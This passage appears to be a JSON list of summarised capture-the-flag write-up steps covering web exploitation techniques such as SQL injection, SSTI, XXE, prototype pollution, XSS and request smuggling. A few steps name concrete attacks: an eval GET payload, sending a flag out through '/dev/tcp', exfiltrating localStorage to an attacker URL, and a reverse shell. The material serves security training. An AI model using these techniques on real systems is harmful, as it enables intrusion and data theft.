    "Understand the deserialization of the added cookie into an 'access_log' object",
    "The deserialized object is assigned to the $perm variable in 'authentication.php'",
    "The assignment to $perm triggers the catch block",
    "The flag is inadvertently printed in the catch block due to the '__toString()' method of the 'access_log' class",
    "Discovered that `||` is the SQLite concatenation operator and is used to join strings together",
    "' AND password=' is treated as a string and hence, ignored",
    "Executed SQL statement: SELECT username, password FROM users WHERE username='adm' || trim('in',' AND password=') || ''",
    "Recognized that this SQL statement is equivalent to SELECT username, password FROM users WHERE username='adm' || 'in' || ''",
    "Parsed the challenge PHP source code.",
    "Noted potential XXE vulnerability because of 'LIBXML_NOENT' flag in 'loadXML()' function.",
    "The XML part substitutes an entity 'myExternalEntity' with '/etc/passwd', hinting at XXE exploitation.",
    "Unable to find flag files.",
    "Confirmed that remote code execution (RCE) was necessary.",
    "Ran PHP code while XML parsing is performed.",
    "Used 'php://filter/'",
    "Base64 encoded the output of the PHP 'phpinfo()' function.",
    "Analyzed 'phpinfo()' output.",
    "Identified 'disable_functions' configuration.",
    "Identified that functions for shell command execution were disabled.",
    "Bypassed 'disable_functions' on PHP 7.0-8.0 versions.",
    "Gained shell remote code execution.",
    "Modified the payload script.",
    "Ran '/readflag' by passing it as an argument to the defined 'pwn' function.",
    "Started examining the Dockerfile provided.",
    "Identified a misconfiguration in the `apache.conf` file.",
    "Noticed that `<Directory />` is incorrectly set to refer to the filesystem directory and not the web root.",
    "Recognized this configuration grants access to any file on the filesystem.",
    "Checked server responses to identify Apache server version (2.4.49).",
    "Found PHP script",
    "Interpreted the PHP script",
    "Noted SQL errors",
    "Investigated gallery.php.",
    "Identified an SQL injection vulnerability.",
    "Investigated users.php page.",
    "Identified possible injection vectors.",
    "Notice the validation of arbitrary code execution",
    "Enable the 'debug' option",
    "Examine the source code of the page",
    "Identify the 'eval()' vulnerability",
    "Understand the list of blocked keywords/functions in the source PHP code",
    "Identify the variables $blocked, $special_block, and $$special_block",
    "Recognize that they are defined before the 'eval()' statement",
    "Understand that they can be referenced in the eval-ed code",
    "Understand the concept of $$ variable in PHP",
    "Analyze how $$ variable is used in the code",
    "Reference the blocked function and restricted file",
    "Set the GET parameter to '?print=echo+'';print(eval('return ${blocked}[4](${nc});'))'",
    "Observe the execution of eval function",
    "Realize that eval does not display the output",
    "Use print to display the output",
    "Identified an admin bot script provided by the challenge.",
    "Analyzed the notes app's JavaScript source code.",
    "The script loads a template including the query for each possible character.",
    "Noted that subdomains and port numbers are ignored in cache keys.",
    "Determine that the source code is exposed",
    "Locate the 'app.py' file",
    "Determine the presence of a vulnerability in the 'new chat' feature",
    "Identify the condition for invoking the 'send_sms' function",
    "Recognize the location of the 'send_sms' function in 'sms.py'",
    "Recognize the usage of Flask's 'render_template_string' function",
    "Identify the utilization within the 'send_sms' function",
    "Understand the control of the resulting template",
    "Recognize 'login' as the user-controllable portion",
    "Recognize the potential for Server-Side Template Injection (SSTI)",
    "Identify the 'add_money_to_login' function added to the template context",
    "Invoke the 'render_template_string' function using the SMS message",
    "Trigger the 'add_money_to_login' function through the 'render_template_string' function",
    "Discover the server technology.",
    "Identify PHP as the server technology.",
    "Notice that .html files are rendered inline.",
    "Realize the filtering of .php extensions.",
    "Notice the recursive nature of the filtering.",
    "Verify that .phtml extension executes PHP code.",
    "Determine that the .phtml extension is not being filtered.",
    "Choose a .phtml file for upload.",
    "Execute the command cat /flag.txt.",
    "Blacklist works based on 'localhost' and '127'.",
    "Understood that the server uses Python's requests library to issue GET requests to the submitted URL.",
    "Identified content lengths as indicators of page existence due to uniform content length of Not Found (404) pages.",
    "Discovered that arbitrary HTML submitted is rendered by the admin's browser.",
    "Introduced three separate payloads in the HTML.",
    "Inspect the given source code.",
    "Recognize that there's a well-known deserialization vulnerability in node.js.",
    "Understand that RCE can be achieved by passing a serialized object into 'serialize.unserialize()'.",
    "Understand that a JavaScript Immediately Invoked Function Expression (IIFE) can be used for RCE.",
    "Understand that the reverse shell payload will be fired when the data is deserialized.",
    "Paste the copied output into the function body.",
    "Checked source code.",
    "Understood that 'JSON.parse' allows the '__proto__' key.",
    "Leveraged the prototype pollution to run 'require('./usage')'.",
    "Noticed that causing a TypeError triggers the 'require('./usage')'.",
    "Interpreted how 'pkg' and 'pkgPath' can be controlled.",
    "Controlled 'pkg' by polluting '__proto__.data'.",
    "Controlled 'pkgPath' by polluting '__proto__.path'.",
    "Found out that 'pkg' is an object containing the 'package.json' fields.",
    "Found out that 'pkgPath' is the path to this package.",
    "Found that we can load any JavaScript file.",
    "Polluted 'data' in '__proto__.data' to load the JavaScript file.",
    "Polluted 'exports' in '__proto__.path' to load the JavaScript file.",
    "Found '/opt/yarn-v1.22.19/preinstall.js' in the container.",
    "Identified that 'child_process.execFileSync' is being called in 'preinstall.js'",
    "Understood that to reach this code path, 'npm_config_global' needs to be polluted.",
    "Polluted 'npm_config_global' to a truthy value.",
    "Realized that 'process.env.npm_execpath' can be controlled.",
    "Set 'process.env.npm_execpath' to a controlled value.",
    "Figured out how to use '--eval' option to run inline JavaScript.",
    "Realized JSON payload cannot have spaces due to regex match.",
    "Used '${IFS}' to get around the regex match restriction.",
    "Guess that the server was using FastAPI.",
    "Understand the functionality of the `/new` endpoint.",
    "Check if the uploaded zip file should contain a `run` bash script.",
    "The `run` bash script gives a reverse shell.",
    "View the source code of the program.",
    "Discover that if a zip file with 'docker-entry' in its name is uploaded.",
    "The program will execute the script within a docker container with greater access (runs as `uploaded` user).",
    "As opposed to executing normally (runs as `nobody` user).",
    "Write a binary.",
    "Compile the binary.",
    "Set the effective user and group IDs to that of the SUID and SGID permissions.",
    "Run the binary inside the docker container.",
    "Observe the configuration file of the Traefik service",
    "Examine the Go microservice",
    "Note that the Go microservice uses the Beego web framework",
    "Note that the Go microservice acts as a reverse proxy for the Python microservice when the PUT method is used",
    "Evaluate the Python microservice",
    "Realize the challenge of reaching the Python microservice that only accepts the PUT method",
    "Inspect the Beego source code",
    "Reach the 'Put()' handler of the Go microservice",
    "Identify that the Python microservice runs on Flask's built-in server",
    "Note that the Flask server treats underscores ('_') as hyphens ('-')",
    "Note that the Flask server allows duplicate 'Content-Length' headers",
    "Obtain the flag",
    "Go through the provided source code.",
    "Spot an interesting behavior with 'RegExp.prototype.test()' used with regex containing the global flag.",
    "Find a way around the restrictive regex check.",
    "Understand the requirement of a 'Buffer' of 16 bytes.",
    "Leverage the behavior of 'Buffer' stopping at the first non-hexadecimal character.",
    "Look into the provided source code to understand how the application works.",
    "Read the function getBrowserWithTimeout.",
    "Consider that the debugging port is generated from the getRandomPort function.",
    "Code a web page that uses a Promise.",
    "If the URL loads, log that the port is open.",
    "Use the Runtime.evaluate method for sending the code.",
    "Observe the page indicating SQL Injection attacks are blocked.",
    "Write an SQLMap tamper script.",
    "Discovered that the 'uri' is appended to the backend URL using Python's urllib.parse.urljoin.",
    "Realized the issue with urllib.parse.urljoin.",
    "Identified that urllib.parse.urljoin can return the appended path as the base URL when handling malformed paths.",
    "Identify the endpoint /rin that uses SSRF code.",
    "Analyzed the provided source code.",
    "Examined the search function.",
    "Analyzed the MySQL query builder in the search function.",
    "Observed restrictions on certain characters and strings.",
    "Noted restrictions on space, 'AND', 'OR', etc.",
    "Brute-forced the OTP character by character.",
    "Constructed a PHP redirect to access 'localhost:8081/flag'.",
    "View the source code of the PHP page",
    "Locate the PHP script that compares the md5 hashes of 'i1' and 'i2'",
    "Comprehend the loose comparison ('==') operator used in PHP to compare two md5 hashes",
    "Learn that if a string starts with '0e...' in PHP, it is treated as a float with the value 0.0",
    "Execute PHP commands to confirm the behavior of '0e...' strings being treated as 0.0 in PHP",
    "Acknowledge the existence of 'magic hashes' that PHP considers equal",
    "Consult a list of strings that generate these 'magic hashes' in PHP",
    "Receive a server response containing the flag value: 'CTFSG{you_see_me_in_h1nds1ght_tangled_up_with_you_all_night}'",
    "Analysed the `main.dart.js`.",
    "Examined features of the application.",
    "Recognized that the app is rendered on a `<canvas>`.",
    "Manipulated the `widget` parameter.",
    "Caused a traceback.",
    "Identified the remote Flutter widget file signature.",
    "Decoded the `chatmessage` widget.",
    "Tried to manipulate the `clipboard_getData` function.",
    "Found the `clipboard_getData` function in `main.dart.js`.",
    "Took a closer look at `poll.dart`.",
    "Recognized the Mechanism `ApiMapper` in `poll.dart`.",
    "Recognized the `onPressed` event handler `api_post`.",
    "Modified the `ApiMapper`.",
    "Modified the GET request.",
    "Used the `onLoaded` event handler.",
    "Discover that using a sufficiently large 'id' can cause an out-of-bound memory read.",
    "Realize that the RAM can be dumped using this technique.",
    "Execute a Python script.",
    "Review the site's JavaScript.",
    "Understand that the 'demo()' function is called on the 'demo' GET request parameter.",
    "Discover the 'mock()' function.",
    "Understand that it is a wrapper function.",
    "Realize that it runs the function exposed by the WASM module.",
    "Identify that the WASM module uses the 'str.length' to validate the buffer.",
    "Find that the Unicode character '\u00df' turns into two characters 'SS' when converting to upper case.",
    "Realize that this allows us to bypass the JavaScript's check.",
    "Take into account that JavaScript is a case-sensitive language.",
    "Understand that our payload is converted to uppercase before being written to the innerHTML.",
    "Modify the initial JavaScript payload.",
    "Replace the string 'alert(1)' with the converted string of our JavaScript payload.",
    "Make the JavaScript payload fetch localStorage.getItem('flag') and send it to the attacker's URL.",
    "Analyzing the provided Javascript and Dockerfile scripts.",
    "Noticing the main class, Database, which creates, retrieves and generates tokens for notes.",
    "Identifying that process.env.FLAG in db.createNote({ data: process.env.FLAG }) is storing the flag.",
    "Discovering a programming error where crypto.randomUUID (the function) is used as the secret, instead of calling it.",
    "Understanding that the secret is not 'secret-[random UUID]' as expected, but it is the string: 'secret-function randomUUID(options) { if (options !== undefined) validateObject(options, 'options'); const { disableEntropyCache = false, } = options || {}; validateBoolean(disableEntropyCache, 'options.disableEntropyCache'); return disableEntropyCache ? getUnbufferedUUID() : getBufferedUUID(); }'.",
    "Using the method 'db.generateToken(0)' to generate the token.",
    "Understand that the WebSockets library used is flask_sockets.",
    "Analyse PHP code.",
    "Understand regex filter on 'f' parameter.",
    "Bypass character filter.",
    "Use wildcard '?' to match any single character.",
    "Decompile binary.",
    "Identify string 'sRPd45w_0' in decompiled code.",
    "Understand permission of pipe character '|'.",
    "Terminate 'cat' command with '|'.",
    "Execute new command.",
    "Use character substitution '$()'.",
    "Read strings from the binary.",
    "Construct regex pattern.",
    "Use character substitution to pass argument.",
    "Recognize the need to rearrange password.",
    "Recognize correct rearrangement as 'sRPd45w_0'.",
    "Develop script for indexing and reconstructing.",
    "Identified the possibility of XSS in a user's profile.",
    "Saw that the Markdown was parsed using 'marked' and 'DOMPurify'.",
    "Ruled out mutation XSS attacks on these libraries as 'marked' does not sanitize output HTML.",
    "Looked more into Jinja2 and found the 'safe' filter that renders unescaped HTML.",
    "Identified the HTML injection vector via 'profile.html' template.",
    "Started a HTTP server, created the '/static/js' directory structure, and placed XSS payload in 'marked.min.js'.",
    "Injected '<base href=\"http://HOST:PORT\">' into the profile via 'user['title']' or 'user['lab']'.",
    "Discovered that it allows for a domain-literal format, which permits just about any printable ASCII character.",
    "Tested the SSTI vulnerability by crafting a URL that performed simple arithmetic in the email parameter using Jinja2 template syntax.",
    "Analyze the given Python script",
    "Identify the structure of the Python script",
    "Identify the functionality of the Python script",
    "Identify the version of SQL Alchemy",
    "Learn about the older version of SQLAlchemy",
    "Observe the vulnerability's location after the ORDER BY clause",
    "Learn about using the CASE clause to determine the column of the result being sorted",
    "Learn about the SQLite code",
    "Identify the vulnerable order_by() function",
    "Learn that the SQLite code can be injected into the vulnerable order_by() function",
    "Identify the payload",
    "If the character matches 5, set the LIMIT to 1",
    "If the character does not match 5, set the LIMIT to 2",
    "Create a Python script",
    "Specify an alphabet to iterate over",
    "Check the 'Content-length' response header",
    "Compare the response header with the chosen character",
    "Identify if the chosen character is correct based on the response header",
    "Check if no character in the alphabet is causing a change in content length",
    "Break the script if no character is causing a change in content length",
    "Discovered that HTML injection is possible",
    "Identified that the user agent is `wkhtmltoimage`",
    "To find the flag",
    "Identify XSS vulnerability in the feedback feature of the site.",
    "Analyzed the JavaScript source.",
    "Identified the use of a message event handler.",
    "Identified a loophole in the 'search' feature.",
    "Recognized that 'this.noteData' remained the same after sanitization.",
    "Noted the absence of 'window.enable_experimental_features'.",
    "Utilized DOM clobbering.",
    "Overrode the 'window.enable_experimental_features' property.",
    "Demonstrated DOM clobbering.",
    "Unintended solution using 'Lazy-loading' property.",
    "Concluded the extra div was rendered when no request is received.",
    "Wrote a script for the attack.",
    "Different intended solution using 'PerformanceLongTaskTiming API'.",
    "Wrote a script using 'setTimeout' function.",
    "Examined the site's JavaScript script 'script.js'.",
    "Identified the message event handler added to the window.",
    "Verified that the event handler is added after meeting several checks.",
    "Confirmed the possibility of creating a new repository with a CNAME file containing 'asdf.jsapi.tech'.",
    "Examined the code to understand the note saving mechanism.",
    "Identified the addition of note contents to the 'data-last' attribute of the '#note-text-area' element.",
    "Noted the usage of DOMPurify v2.3.0 tool for sanitizing the note.",
    "Verified that 'link' and 'style' tags are explicitly permitted during sanitization.",
    "Examined the Content-Security-Policy (CSP) of the site.",
    "Observed the usage of 'asdf<link rel='stylesheet' href='...'>'.",
    "Identified the CSS rule with 'background' property.",
    "Examined the Python script used for the attack.",
    "Noted the usage of the Python script to generate CSS.",
    "Updated the CSS in the redeployed page.",
    "Identify that it was a Jinja2 Template Injection challenge.",
    "Work on bypassing '{{' by using an if-else statement.",
    "Work on bypassing '}}' by using an if-else statement.",
    "Find a workaround for using '.' by employing the 'attr' filter.",
    "Utilize 'first' to get the first item of a list.",
    "Utilize 'last' to get the last item of a list.",
    "Bypass '_' by constructing a string",
    "Bypass '\\' by constructing a string",
    "Bypass 'class' by constructing a string",
    "Bypass 'subclasses' by constructing a string",
    "Bypass 'getitem' by constructing a string",
    "Leverage 'lower' filter to bypass 'class' string.",
    "Leverage 'lower' filter to bypass 'subclasses' string.",
    "Leverage 'lower' filter to bypass 'getitem' string.",
    "Join the 'class' string with preceding and ending '__' characters using 'join' filter.",
    "Set 'x' corresponding to the index of 'subprocess.Popen'.",
    "Identified HAProxy configuration.",
    "The request smuggling caused the difference in the response.",
    "Identify the presence of the 'src=' parameter in the target website's HTML code.",
    "Examine the Content-Security-Policy of the target website.",
    "Observe the presence of a 'nonce' in the Content-Security-Policy that allows a script with src='assets/js/bootstrap.js'.",
    "Host a custom script as 'assets/js/bootstrap.js' on the attacker-controlled site.",
    "Modify the script to append the created 'img' element to the document body.",
    "Determine that LibreOffice is the specific tool employed for document conversions.",
    "Open 'content.xml' and modify its contents to include a payload that links to the '/flag' file.",
    "Created a PHP script.",
    "Configured the PHP script to redirect to itself 19 times.",
    "Tested rendering of the reflected input in the browser.",
    "Identified the Content-Type of the XSL document as 'text/xsl'.",
    "Explored different methods for conducting XSS attacks on XSL documents.",
    "Identified that the input was being reflected.",
    "Realized the Content-Type was 'text/xsl'.",
    "Analyze the Python code for the challenge.",
    "The code manages a market API.",
    "Identify the bug in the API.",
    "Review the battle endpoint.",
    "LOYALTY_SYSTEM_ACTIVE is set to False.",
    "Increasing fame is impossible.",
    "Examine the buy endpoint.",
    "Note the introduced code problem.",
    "Mutable namedtuple assignment raises AttributeError.",
    "Understand immutability of namedtuple and tuple.",
    "Note the difference between += and x = x + y.",
    "+= performs the operation in place when possible.",
    "+= tries to assign the result back to the variable.",
    "Identify that the code involves an XML parser.",
    "Notice the use of 'ElementInclude.include(root)' in the code.",
    "Understand that 'ElementInclude.include(root)' allows the use of XInclude directives.",
    "Recognize that XInclude directives allow the parsing of files.",
    "Identify that the server checks if 'text' is not included in 'xml.lower()'.",
    "Understand that 'parse=\"xml\"' raises an error when used with non-XML content.",
    "Devise a workaround by defining XML entities to form the string 'text'",
    "Identify vulnerability in '/api/tet/list' endpoint.",
    "Observe user input being passed to 'require()'.",
    "Notice 'require()' leads to a Local File Inclusion (LFI) vulnerability.",
    "Consider potential .js file candidates for execution.",
    "Note that node_modules folder contains source code of installed modules.",
    "Execute 'grep' command.",
    "Find 'changelog.js' script.",
    "Find 'update-dist-tags.js' script.",
    "Analyze the 'changelog.js' script.",
    "Identify 'execSync' call in the script.",
    "Notice absence of arguments in 'require()' call.",
    "Identify 'process.argv[2]' as undefined.",
    "Plan to import the 'changelog.js' file after the pollution.",
    "Perform local test using a python command.",
    "Pollute '__proto__' attribute with a command injection payload in the 'data'.",
    "Specify 'changelog.js' script in the path of the JSON payload.",
    "Accessed HTML source to find clues",
    "Created a Python script that opens a reverse shell",
    "Inspect the source code.",
    "Recognize that the express.json() allows Object and Array types to be given as req.body.email and req.body.password.",
    "Use this behaviour when constructing SQL queries to bypass the login.",
    "Realize that the /do-report endpoint is mapped to /forbidden.",
    "Modify the available PoC to suit the given context.",
    "Smuggle a request to the backend application.",
    "Understand that the verify.pug template has an unescaped username.",
    "For each text fragment, detect if a callback is received.",
    "Adjust necessary parameters in the python script.",
    "Identify weak point in code",
    "Recognise potential exploit",
    "Result: buyer's balance increases due to subtraction in 'buyFlag' function",
    "Notice that the scripts are always executed due to the `nonce` in the CSP.",
    "Note that the relative paths now load scripts from the attacker's server.",
    "Enable CORS to execute arbitrary JavaScript through the hosted file.",
    "Create a new script element.",
    "Add the appropriate `nonce` from the rest of the script tags.",
    "Set the script source to the data wanted to exfiltrate.",
    "Append the new script to the body of the document.",
    "Initialize for loop.",
    "Print response from the server using command r.text.",
    "Examined 'auth.py'.",
    "Noticed rate limiting being enforced on a per-email basis through a Redis store.",
    "Failed as the function doesn't allow special characters like '%'.",
    "Understood that the `'re.match'` only matches at the _beginning_ of the string.",
    "Noticed that wildcards are allowed at the _end_ of the email due to `'re.match'` behavior.",
    "Ensured the user script run by application was active.",
    "Inspected Create Post code.",
    "Identified the BeautifulSoup module being used to sanitize HTML.",
    "Recognized a restrictive CSP.",
    "Exploited parser differential in BeautifulSoup.",
    "Analysed the server's CSP policy.",
    "Created a callback that reflected the response into Javascript code.",
    "Submitted final payload that contained a script.",
    "Exploited YouTube's JSONP response and BeautifulSoup's parsing differential.",
    "Repeated the Javascript injection to fetch the flag.",
    "Identify the presence of 'news' string in the JavaScript code.",
    "Notice that the site prepends a backslash to escape the single quote.",
    "Discover that the backslash character itself isn't escaped.",
    "Attempt to break out using '?cat=news\\\\''.",
    "Find that any brackets or subsequent quotes are still escaped.",
    "Find that the feature allows specifying a remote document portion to insert.",
    "Remove the 'noscript' tag.",
    "Derive a proof-of-concept (PoC) to brute-force a character of the flag by exploiting the observed behavior",
    "Observe that the violation can be detected through a 'securitypolicyviolation' event listener",
    "Build the asmbb engine source code using the Fresh IDE with Linux as the target OS",
    "Analyze the AsmBB source's render2.asm file",
    "Inspect the functionality of the 'minimag' command",
    "Inspect the functionality of the 'bbcode' command",
    "Familiarize with TranslateBBCode routine",
    "TranslateBBCode routine is in bbcode.asm file part of FreshLib",
    "TranslateBBCode routine processes BBCode tags",
    "The HTML encoding process of individual characters is done in the loop function",
    "Discover an edge case where not closing a BBCode tag results in an unencoded content being reflected",
    "The unencoded content being reflected leads to an alert in the browser",
    "Identify two other POST-based XSS vectors",
    "Determine that a setting called 'Pipe the emails through' uses the 'smtp_exec' variable",
    "The 'smtp_exec' variable is used as an argument to the Exec2 routine",
    "Modify the 'Pipe the emails through' command",
    "Send the flag to an external server using the '/readflag>/dev/tcp' command",
    "Identify prototype pollution vulnerability",
    "Vulnerability found in `utils.merge()` method",
    "Identify off-by-one error in `background.js` font validation",
    "Manipulate `utils.FONTS[10]` using the off-by-one error",
    "Understand that ATS processes LF as line endings.",
    "Understand that Waitress allows LF in chunked extensions.",
    "Note how ATS processes the LF as the end-of-line.",
    "Note how the second request is encapsulated in the chunked content of the first request.",
    "Exploited a difference in how ATS and Waitress process end-of-line symbols.",
    "Discover RCE vulnerability through pre-installed 'pearcmd.php'.",
    "Construct PHP payload.",
    "Include '/tmp/pwn.php' using LFI.",
    "Understand that the challenge focuses on exploiting dynamic renderers",
    "Understand that Prerender is used to render sensitive endpoints",
    "Take note of the Nginx configuration",
    "Acknowledge the implementation of extra checks",
    "Understand that XSS within the Chromium renderer is necessary",
    "Take notice of the 'validateUrls' mechanism",
    "Understand that the mechanism can be bypassed using 'username:password@hostname' URL format",
    "Recognize the naive 'script remover'",
    "Understand that script tags can be bypassed using 'onload' event handlers",
    "Configured the server to give two different responses.",
    "Notice that 'mootools' JavaScript library is used.",
    "Execute Prototype pollution attack.",
    "Notice that a 'note' is 'found' if it starts with 'request.search'.",
    "Verify if a substring exists in the flag.",
    "Identify the suspicious logic of the JavaScript.",
    "Notice that the 'name' variable is not declared in this case.",
    "Observe that global scope is the window object in HTML.",
    "Note that the 'name' variable refers to 'window.name'.",
    "Understand that 'window.name' can be controlled when a new window is opened.",
    "Recreate the scenario where 'name' variable is never redeclared.",
    "Create an exploit script.",
    "Control the 'window.name' variable with the exploit script.",
    "Identified a Use After Free (UAF) vulnerability.",
    "Noticed that the HEAD never updates if the first index is removed.",
    "Realized that `HEAD->name` can be controlled.",
    "Identified the next `malloc()` call in `insertSorted()` where the overwrite can happen.",
    "Noted the absence of ASLR in WASM.",
    "Determined that the address of the XSS payload can be predicted.",
    "Noticed that the `name` is written to memory regardless of XSS check.",
    "Identified the possibility of 'inserting' and overwriting the XSS payload in the `HEAD->name`.",
    "Realized that `getNameAtIndex(0)` will return the XSS payload when displaying the table.",
    "Noticed that `$var8` is set immediately after `call $dlmalloc`.",
    "Understood that `$var8` represents the pointer to the newly allocated memory for the payload."
]